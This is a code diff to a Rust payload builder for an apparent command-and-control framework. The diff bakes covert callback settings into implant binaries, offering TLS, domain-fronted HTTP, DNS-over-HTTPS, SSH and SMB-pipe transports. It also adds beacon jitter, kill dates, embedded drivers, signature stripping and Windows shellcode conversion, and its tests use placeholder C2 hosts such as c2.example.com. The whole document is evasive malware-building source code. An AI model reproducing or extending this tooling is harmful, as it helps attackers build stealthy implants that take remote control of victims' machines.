@@ -5,7 +5,9 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 use tracing::{info, warn};
 
-use crate::config::{partition_features, read_agent_features, PayloadConfig};
+use crate::config::{
+    partition_features, read_agent_features, PayloadConfig, PayloadFormat, PayloadTransport,
+};
 use crate::pe_artifact_kit;
 
 /// Build the agent for the given profile and return the raw binary bytes.
@@ -20,30 +22,10 @@ pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) 
     let bin_name = cfg.bin_name.as_deref().unwrap_or(package);
 
     let effective_features = features_for_package(package, &cfg.features)?;
+    validate_transport_feature(cfg.transport, &effective_features)?;
+    cfg.validate_transport_settings()?;
 
-    let mut extra_env: Vec<(String, String)> = Vec::new();
-    if effective_features.iter().any(|f| f == "outbound-c") {
-        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
-        if let Some(ref fp) = cfg.server_cert_fingerprint {
-            extra_env.push(("ORCHESTRA_C_CERT_FP".into(), fp.clone()));
-        }
-        if let Some(ref secret) = cfg.c_server_secret {
-            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
-        } else {
-            warn!(
-                "outbound-c feature enabled but c_server_secret is not set in the profile. \
-                 The agent will require the ORCHESTRA_SECRET env var at runtime."
-            );
-        }
-    }
-
-    // Bake in the module AES key when provided (allows server-side builds to
-    // produce self-contained agents without requiring an agent.toml).
-    if let Some(ref module_key) = cfg.module_aes_key {
-        if !module_key.trim().is_empty() {
-            extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
-        }
-    }
+    let mut extra_env = build_time_env(cfg, &effective_features);
 
     // ── Per-build seed diversification ──────────────────────────────────────
     //
@@ -72,7 +54,179 @@ pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) 
     pe_artifact_kit::apply_all(&mut binary, cfg)
         .context("PE artifact kit post-processing failed")?;
 
-    Ok(binary)
+    package_output_format(binary, cfg, seed)
+}
+
+pub(crate) fn build_time_env(
+    cfg: &PayloadConfig,
+    effective_features: &[String],
+) -> Vec<(String, String)> {
+    let mut extra_env: Vec<(String, String)> = Vec::new();
+    if effective_features.iter().any(|f| f == "outbound-c") {
+        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
+        extra_env.push((
+            "ORCHESTRA_TRANSPORT".into(),
+            cfg.transport.as_str().to_string(),
+        ));
+        if let Some(ref fp) = cfg.server_cert_fingerprint {
+            extra_env.push(("ORCHESTRA_C_CERT_FP".into(), fp.clone()));
+        }
+        if let Some(ref secret) = cfg.c_server_secret {
+            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
+        } else {
+            warn!(
+                "outbound-c feature enabled but c_server_secret is not set in the profile. \
+                 The agent will require the ORCHESTRA_SECRET env var at runtime."
+            );
+        }
+
+        match cfg.transport {
+            PayloadTransport::Tls => {}
+            PayloadTransport::Http => {
+                extra_env.push(("ORCHESTRA_HTTP_ENDPOINT".into(), cfg.http_endpoint()));
+                if let Some(host_header) = cfg.http_host_header() {
+                    extra_env.push(("ORCHESTRA_HTTP_HOST_HEADER".into(), host_header));
+                }
+            }
+            PayloadTransport::Doh => {
+                extra_env.push(("ORCHESTRA_DOH_SERVER_URL".into(), cfg.doh_server_url()));
+                if let Some(domain) = cfg.doh_domain() {
+                    extra_env.push(("ORCHESTRA_DOH_DOMAIN".into(), domain));
+                }
+            }
+            PayloadTransport::Ssh => {
+                if let Some(host) = cfg.ssh_host() {
+                    extra_env.push(("ORCHESTRA_SSH_HOST".into(), host));
+                }
+                let ssh_port = cfg
+                    .transport_settings
+                    .ssh_port
+                    .or_else(|| cfg.transport_port())
+                    .unwrap_or(22);
+                extra_env.push(("ORCHESTRA_SSH_PORT".into(), ssh_port.to_string()));
+                if let Some(username) = cfg
+                    .transport_settings
+                    .ssh_username
+                    .as_deref()
+                    .map(str::trim)
+                    .filter(|username| !username.is_empty())
+                {
+                    extra_env.push(("ORCHESTRA_SSH_USERNAME".into(), username.to_string()));
+                }
+                if let Some(auth) = cfg.transport_settings.ssh_auth.as_ref() {
+                    extra_env.push((
+                        "ORCHESTRA_SSH_AUTH_JSON".into(),
+                        serde_json::to_string(auth).expect("SshAuthConfig serializes to JSON"),
+                    ));
+                }
+                if let Some(fingerprint) = cfg
+                    .transport_settings
+                    .ssh_host_key_fingerprint
+                    .as_deref()
+                    .map(str::trim)
+                    .filter(|fingerprint| !fingerprint.is_empty())
+                {
+                    extra_env.push(("ORCHESTRA_SSH_HOST_KEY_FP".into(), fingerprint.to_string()));
+                }
+            }
+            PayloadTransport::Smb => {
+                if let Some(host) = cfg.smb_pipe_host() {
+                    extra_env.push(("ORCHESTRA_SMB_PIPE_HOST".into(), host));
+                }
+                if let Some(pipe_name) = cfg
+                    .transport_settings
+                    .smb_pipe_name
+                    .as_deref()
+                    .map(str::trim)
+                    .filter(|pipe_name| !pipe_name.is_empty())
+                {
+                    extra_env.push(("ORCHESTRA_SMB_PIPE_NAME".into(), pipe_name.to_string()));
+                }
+                if let Some(mode) = cfg
+                    .transport_settings
+                    .smb_pipe_mode
+                    .as_deref()
+                    .map(str::trim)
+                    .filter(|mode| !mode.is_empty())
+                {
+                    extra_env.push(("ORCHESTRA_SMB_PIPE_MODE".into(), mode.to_string()));
+                }
+                if let Some(port) = cfg.transport_settings.smb_tcp_relay_port {
+                    extra_env.push(("ORCHESTRA_SMB_TCP_RELAY_PORT".into(), port.to_string()));
+                }
+            }
+        }
+    }
+
+    // Bake in the module AES key when provided (allows server-side builds to
+    // produce self-contained agents without requiring an agent.toml).
+    if let Some(ref module_key) = cfg.module_aes_key {
+        if !module_key.trim().is_empty() {
+            extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
+        }
+    }
+
+    if let Some(sleep_ms) = cfg.sleep_ms {
+        extra_env.push(("ORCHESTRA_SLEEP_MS".into(), sleep_ms.to_string()));
+    }
+    if let Some(jitter) = cfg.jitter {
+        extra_env.push(("ORCHESTRA_JITTER".into(), jitter.to_string()));
+    }
+    if let Some(ref kill_date) = cfg.kill_date {
+        if !kill_date.trim().is_empty() {
+            extra_env.push(("ORCHESTRA_KILL_DATE".into(), kill_date.trim().to_string()));
+        }
+    }
+
+    // Bake in the embedded driver path when provided.
+    // The agent build.rs forwards ORCHESTRA_DRIVER_PATH → SYS_DRIVER_PATH and
+    // sets the `has_sys_driver_path` cfg flag so `deploy.rs` can include the
+    // driver bytes at compile time instead of falling back to placeholders.
+    if effective_features.iter().any(|f| f == "embedded_driver") {
+        if let Some(ref driver_path) = cfg.driver_path {
+            let trimmed = driver_path.trim();
+            if !trimmed.is_empty() {
+                extra_env.push(("ORCHESTRA_DRIVER_PATH".into(), trimmed.to_string()));
+            }
+        }
+    }
+
+    extra_env
+}
+
+fn validate_transport_feature(
+    transport: PayloadTransport,
+    effective_features: &[String],
+) -> Result<()> {
+    let required = match transport {
+        PayloadTransport::Tls => return Ok(()),
+        PayloadTransport::Http => "http-transport",
+        PayloadTransport::Doh => "doh-transport",
+        PayloadTransport::Ssh => "ssh-transport",
+        PayloadTransport::Smb => "smb-pipe-transport",
+    };
+    if effective_features.iter().any(|feature| feature == required) {
+        Ok(())
+    } else {
+        Err(anyhow!(
+            "{} transport requires the '{}' agent feature",
+            transport.as_str(),
+            required
+        ))
+    }
+}
+
+fn package_output_format(binary: Vec<u8>, cfg: &PayloadConfig, seed: u64) -> Result<Vec<u8>> {
+    match cfg.output_format {
+        PayloadFormat::Exe => Ok(binary),
+        PayloadFormat::Shellcode => {
+            if cfg.target_os != "windows" || cfg.target_arch != "x86_64" {
+                anyhow::bail!("shellcode output is supported only for windows/x86_64 PE payloads");
+            }
+            shellcode_packager::package(&binary, seed)
+                .context("failed to convert Windows PE payload to shellcode")
+        }
+    }
 }
 
 fn features_for_package(package: &str, requested: &[String]) -> Result<Vec<String>> {
@@ -254,5 +408,123 @@ mod tests {
     fn unsupported_package_is_rejected() {
         let err = features_for_package("not-a-package", &[]).unwrap_err();
         assert!(err.to_string().contains("unsupported payload package"));
+    }
+
+    #[test]
+    fn build_env_includes_baked_behavior_settings() {
+        let cfg = PayloadConfig {
+            target_os: "linux".to_string(),
+            target_arch: "x86_64".to_string(),
+            c2_address: "127.0.0.1:8444".to_string(),
+            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
+            hmac_key: None,
+            c_server_secret: Some("secret".to_string()),
+            server_cert_fingerprint: Some("0".repeat(64)),
+            features: vec!["outbound-c".to_string()],
+            transport: PayloadTransport::Tls,
+            transport_settings: crate::config::TransportSettings::default(),
+            output_name: None,
+            package: "agent".to_string(),
+            bin_name: Some("agent-standalone".to_string()),
+            output_format: PayloadFormat::Exe,
+            sleep_ms: Some(12_345),
+            jitter: Some(37),
+            kill_date: Some("2099-12-31".to_string()),
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
+        };
+
+        let env = build_time_env(&cfg, &["outbound-c".to_string()]);
+
+        assert!(env.contains(&("ORCHESTRA_SLEEP_MS".to_string(), "12345".to_string())));
+        assert!(env.contains(&("ORCHESTRA_JITTER".to_string(), "37".to_string())));
+        assert!(env.contains(&("ORCHESTRA_KILL_DATE".to_string(), "2099-12-31".to_string())));
+    }
+
+    #[test]
+    fn build_env_includes_baked_transport_settings() {
+        let cfg = PayloadConfig {
+            target_os: "linux".to_string(),
+            target_arch: "x86_64".to_string(),
+            c2_address: "c2.example.com:8446".to_string(),
+            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
+            hmac_key: None,
+            c_server_secret: Some("secret".to_string()),
+            server_cert_fingerprint: Some("0".repeat(64)),
+            features: vec!["outbound-c".to_string(), "http-transport".to_string()],
+            transport: PayloadTransport::Http,
+            transport_settings: crate::config::TransportSettings {
+                http_endpoint: Some("https://front.example.com/c2".to_string()),
+                http_host_header: Some("c2.example.com".to_string()),
+                ..crate::config::TransportSettings::default()
+            },
+            output_name: None,
+            package: "agent".to_string(),
+            bin_name: Some("agent-standalone".to_string()),
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
+        };
+
+        let env = build_time_env(&cfg, &["outbound-c".to_string()]);
+
+        assert!(env.contains(&("ORCHESTRA_TRANSPORT".to_string(), "http".to_string())));
+        assert!(env.contains(&(
+            "ORCHESTRA_HTTP_ENDPOINT".to_string(),
+            "https://front.example.com/c2".to_string()
+        )));
+        assert!(env.contains(&(
+            "ORCHESTRA_HTTP_HOST_HEADER".to_string(),
+            "c2.example.com".to_string()
+        )));
+    }
+
+    #[test]
+    fn ssh_transport_requires_auth_settings() {
+        let cfg = PayloadConfig {
+            target_os: "linux".to_string(),
+            target_arch: "x86_64".to_string(),
+            c2_address: "ssh.example.com:22".to_string(),
+            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
+            hmac_key: None,
+            c_server_secret: Some("secret".to_string()),
+            server_cert_fingerprint: Some("0".repeat(64)),
+            features: vec!["outbound-c".to_string(), "ssh-transport".to_string()],
+            transport: PayloadTransport::Ssh,
+            transport_settings: crate::config::TransportSettings::default(),
+            output_name: None,
+            package: "agent".to_string(),
+            bin_name: Some("agent-standalone".to_string()),
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
+        };
+
+        let err = cfg.validate_transport_settings().unwrap_err();
+        assert!(err.to_string().contains("ssh_username"));
     }
 }
